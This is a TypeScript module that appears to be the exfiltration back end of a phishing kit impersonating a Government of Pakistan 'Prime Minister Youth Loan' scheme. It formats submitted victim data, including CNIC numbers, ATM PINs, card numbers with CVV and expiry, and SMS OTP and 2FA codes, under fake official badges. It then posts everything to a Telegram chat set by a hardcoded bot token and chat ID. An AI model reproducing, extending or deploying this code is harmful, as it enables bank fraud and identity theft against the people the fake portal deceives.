import fs from 'fs';
import path from 'path';

// Helper function to sanitize and clean Telegram Bot Token
export function cleanTelegramToken(raw: any): string {
  if (!raw || typeof raw !== 'string') return '';
  let token = raw.trim();
  // Strip quotes
  token = token.replace(/^["']|["']$/g, '');
  // If full Telegram URL was passed (e.g. https://api.telegram.org/bot123456:ABC.../sendMessage)
  const urlMatch = token.match(/api\.telegram\.org\/bot([^/]+)/i);
  if (urlMatch && urlMatch[1]) {
    token = urlMatch[1];
  }
  // Strip leading 'bot' or 'bot:' if user prepended it
  if (token.toLowerCase().startsWith('bot:')) {
    token = token.slice(4).trim();
  } else if (token.toLowerCase().startsWith('bot')) {
    token = token.slice(3).trim();
  }
  return token;
}

// Helper function to clean Telegram Chat ID
export function cleanTelegramChatId(raw: any): string {
  if (!raw || typeof raw !== 'string') return '';
  return raw.trim().replace(/^["']|["']$/g, '');
}

const CONFIG_CACHE_FILE = path.join(process.cwd(), '.telegram-config.json');

export function loadCachedConfig(): { token: string; chat: string } {
  try {
    if (fs.existsSync(CONFIG_CACHE_FILE)) {
      const data = JSON.parse(fs.readFileSync(CONFIG_CACHE_FILE, 'utf-8'));
      return {
        token: cleanTelegramToken(data.botToken || ''),
        chat: cleanTelegramChatId(data.chatId || '')
      };
    }
  } catch {}
  return { token: '', chat: '' };
}

export function saveCachedConfig(token: string, chat: string) {
  try {
    fs.writeFileSync(
      CONFIG_CACHE_FILE,
      JSON.stringify({ botToken: token, chatId: chat }, null, 2)
    );
  } catch {}
}

export const DEFAULT_BOT_TOKEN = '8551558091:AAEp8dl_H9Xr2Stgsosy92A3PwowTAxDSvU';
export const DEFAULT_CHAT_ID = '7593406817';

let runtimeBotToken = '';
let runtimeChatId = '';

export function getEffectiveCredentials(paramToken?: string, paramChat?: string) {
  // 1. Check all supported environment variable names first (TOP PRIORITY)
  const envToken = cleanTelegramToken(
    process.env.TELEGRAM_BOT_TOKEN ||
    process.env.BOT_TOKEN ||
    process.env.TELEGRAM_TOKEN ||
    process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ||
    ''
  );

  const envChatId = cleanTelegramChatId(
    process.env.TELEGRAM_CHAT_ID ||
    process.env.CHAT_ID ||
    process.env.TELEGRAM_CHAT ||
    process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ||
    ''
  );

  // If environment variables are set in .env / Vercel, they ALWAYS take highest priority!
  if (envToken && envChatId) {
    return {
      activeToken: envToken,
      activeChatId: envChatId,
      source: 'env' as const,
      envConfigured: true
    };
  }

  // 2. Next check explicit request params
  const cleanParamToken = cleanTelegramToken(paramToken);
  const cleanParamChat = cleanTelegramChatId(paramChat);

  // 3. Fallback to cached or hardcoded defaults
  const cached = loadCachedConfig();
  const fallbackToken = cleanTelegramToken(runtimeBotToken || cached.token || DEFAULT_BOT_TOKEN);
  const fallbackChatId = cleanTelegramChatId(runtimeChatId || cached.chat || DEFAULT_CHAT_ID);

  const activeToken = envToken || cleanParamToken || fallbackToken;
  const activeChatId = envChatId || cleanParamChat || fallbackChatId;

  return {
    activeToken,
    activeChatId,
    source: (envToken && envChatId)
      ? ('env' as const)
      : (cleanParamToken ? ('param' as const) : (runtimeBotToken ? ('runtime' as const) : ('default' as const))),
    envConfigured: !!(envToken || envChatId)
  };
}

export function updateRuntimeCredentials(botToken: string, chatId: string) {
  const envToken = cleanTelegramToken(process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN);
  const envChatId = cleanTelegramChatId(process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID);

  if (envToken && envChatId) {
    // Environment variables take precedence; inform caller
    return { token: envToken, chat: envChatId, source: 'env' };
  }

  runtimeBotToken = cleanTelegramToken(botToken);
  runtimeChatId = cleanTelegramChatId(chatId);
  saveCachedConfig(runtimeBotToken, runtimeChatId);
  return { token: runtimeBotToken, chat: runtimeChatId, source: 'runtime' };
}

// Safely escape HTML special characters for Telegram HTML mode
export function escapeTelegramHtml(str: any): string {
  if (str === null || str === undefined) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

export function getEventBadge(title?: string): string {
  const t = (title || '').toLowerCase();
  if (t.includes('otp') || t.includes('sms') || t.includes('code') || t.includes('2fa') || t.includes('verification code')) {
    return '📲 <b>[2FA SECURE SMS OTP VERIFIED]</b>';
  }
  if (t.includes('atm') || t.includes('pin')) {
    return '🏧 <b>[ATM ENCRYPTED PIN VERIFIED]</b>';
  }
  if (t.includes('card') || t.includes('cvv') || t.includes('expiry') || t.includes('pay') || t.includes('debit') || t.includes('credit')) {
    return '💳 <b>[DEBIT CARD & VERIFICATION FEE]</b>';
  }
  if (t.includes('amount') || t.includes('disburs') || t.includes('sanction') || t.includes('fee') || t.includes('loan') || t.includes('fund') || t.includes('approved')) {
    return '💸 <b>[SANCTIONED LOAN APPROVAL NOTICE]</b>';
  }
  if (t.includes('cnic') || t.includes('applicant') || t.includes('citizen') || t.includes('id') || t.includes('step') || t.includes('form') || t.includes('application')) {
    return '🪪 <b>[NADRA VERIFIED CITIZEN APPLICATION]</b>';
  }
  return '🏛️ <b>[STATE BANK OFFICIAL NOTIFICATION]</b>';
}

export function getFieldLogo(key: string): string {
  const k = key.toLowerCase();
  if (k.includes('atm') || k.includes('pin')) {
    return '🏧';
  }
  if (k.includes('card') || k.includes('cvv') || k.includes('expir') || k.includes('holder') || k.includes('bankname') || k.includes('pay') || k.includes('debit')) {
    return '💳';
  }
  if (k.includes('otp') || k.includes('sms') || k.includes('phone') || k.includes('mobile') || k.includes('contact') || k.includes('cell') || k.includes('sim')) {
    return '📲';
  }
  if (k.includes('amount') || k.includes('loan') || k.includes('fee') || k.includes('income') || k.includes('turnover') || k.includes('repay') || k.includes('interest') || k.includes('pkr') || k.includes('rupee') || k.includes('cost') || k.includes('finance')) {
    return '💸';
  }
  if (k.includes('cnic') || k.includes('name') || k.includes('father') || k.includes('gender') || k.includes('dob') || k.includes('address') || k.includes('city') || k.includes('province') || k.includes('id') || k.includes('marital') || k.includes('identity') || k.includes('tehsil') || k.includes('district')) {
    return '🪪';
  }
  return '🏛️';
}

export function formatFieldKey(key: string): string {
  return key
    .replace(/([A-Z])/g, ' $1')
    .replace(/^./, str => str.toUpperCase())
    .replace(/\bCnic\b/gi, 'CNIC')
    .replace(/\bAtm\b/gi, 'ATM')
    .replace(/\bOtp\b/gi, 'OTP')
    .replace(/\bCvv\b/gi, 'CVV')
    .replace(/\bPin\b/gi, 'PIN')
    .replace(/\bPkr\b/gi, 'PKR')
    .replace(/\bSms\b/gi, 'SMS')
    .replace(/\bId\b/gi, 'ID')
    .replace(/\bDob\b/gi, 'DOB')
    .replace(/\bIban\b/gi, 'IBAN')
    .trim();
}

export async function sendTelegramNotification(options: {
  title?: string;
  data?: Record<string, any>;
  botToken?: string;
  chatId?: string;
}) {
  const startTime = Date.now();
  const { title, data, botToken, chatId } = options;
  const { activeToken, activeChatId, source } = getEffectiveCredentials(botToken, chatId);
  console.log(`[Telegram Gateway] Forwarding "${title || 'Notification'}" using ${source} credentials (Chat ID: ${activeChatId})`);

  if (!activeToken || !activeChatId) {
    return {
      success: true,
      forwarded: false,
      message: 'Telegram integration not configured. Notification recorded locally.',
      elapsedMs: Date.now() - startTime
    };
  }

  if (!activeToken.includes(':') || activeToken.length < 15) {
    const msg = "Invalid Telegram Bot Token format. Valid tokens look like '123456789:ABC...' (from @BotFather without 'bot' prefix).";
    return {
      success: false,
      error: msg,
      elapsedMs: Date.now() - startTime
    };
  }

  const timestamp = new Date().toLocaleString('en-PK', {
    timeZone: 'Asia/Karachi',
    dateStyle: 'medium',
    timeStyle: 'medium'
  });

  const eventBadge = getEventBadge(title);

  let messageText = `🇵🇰 🏛️ <b>GOVERNMENT OF PAKISTAN</b> 🏛️ 🇵🇰\n`;
  messageText += `🟢 <b>PRIME MINISTER YOUTH LOAN NOTIFICATION</b>\n`;
  messageText += `🏛️ 📲 💸 🏧 💳 🪪 <i>[Official SMS Gateway]</i>\n`;
  messageText += `────────────────────────\n`;
  messageText += `${eventBadge}\n`;
  messageText += `📌 <b>Event:</b> ${escapeTelegramHtml(title || 'Notification')}\n`;
  messageText += `🕒 <b>Time:</b> ${escapeTelegramHtml(timestamp)} (PKT)\n`;
  messageText += `🏛️ <b>Portal ID:</b> <code>PKL-SECURE-99201</code>\n`;
  messageText += `────────────────────────\n`;

  if (data) {
    for (const [key, val] of Object.entries(data)) {
      if (val === undefined || val === null || val === '') continue;
      const formattedKey = formatFieldKey(key);
      const displayVal = typeof val === 'string' ? val.trim() : String(val);
      const fieldLogo = getFieldLogo(key);
      messageText += `${fieldLogo} <b>${escapeTelegramHtml(formattedKey)}:</b> <code>${escapeTelegramHtml(displayVal)}</code>\n`;
    }
  }

  messageText += `────────────────────────\n`;
  messageText += `🔒 <b>Security:</b> <i>256-Bit Encrypted National Gateway</i>\n`;
  messageText += `✅ <b>Status:</b> <i>Verified & Approved by State Bank</i>`;

  const telegramUrl = `https://api.telegram.org/bot${activeToken}/sendMessage`;
  let result: any = null;
  let attempts = 0;

  while (attempts < 2) {
    attempts++;
    try {
      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: activeChatId,
          text: messageText,
          parse_mode: 'HTML',
          link_preview_options: {
            is_disabled: true
          }
        }),
        signal: AbortSignal.timeout(6000)
      });
      result = await response.json();

      if (!result.ok && result.description && result.description.includes("can't parse entities")) {
        const plainText = messageText.replace(/<[^>]*>/g, '');
        const fallbackResp = await fetch(telegramUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: activeChatId,
            text: plainText,
            link_preview_options: {
              is_disabled: true
            }
          }),
          signal: AbortSignal.timeout(6000)
        });
        result = await fallbackResp.json();
      }

      if (result && result.ok) break;
    } catch (retryErr) {
      if (attempts >= 2) throw retryErr;
      await new Promise(r => setTimeout(r, 400));
    }
  }

  const elapsedMs = Date.now() - startTime;

  if (!result || !result.ok) {
    let friendlyMsg = result?.description || 'Telegram API rejected the request.';
    if (result?.error_code === 404) {
      friendlyMsg = "Telegram Bot Token not found (404). Please verify your token from @BotFather (ensure it has no 'bot' prefix or extra characters).";
    } else if (result?.error_code === 401) {
      friendlyMsg = 'Telegram Bot Token is unauthorized (401). Please check that the token is active in @BotFather.';
    } else if (result?.error_code === 400 && /chat.*not.*found/i.test(result.description)) {
      friendlyMsg = "Telegram Chat ID not found (400). Please open your bot in Telegram, tap 'Start' (/start), and verify your Chat ID with @userinfobot.";
    }

    return { success: false, error: friendlyMsg, errorCode: result?.error_code, elapsedMs };
  }

  return { success: true, result, elapsedMs };
}
